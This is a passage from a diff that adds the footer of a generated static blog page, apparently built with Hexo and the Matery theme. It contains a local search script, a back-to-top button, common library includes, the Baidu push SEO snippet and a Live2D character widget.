+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+
+</html>
+<script type="text/javascript" src="/js/click_show_text.js"></script>
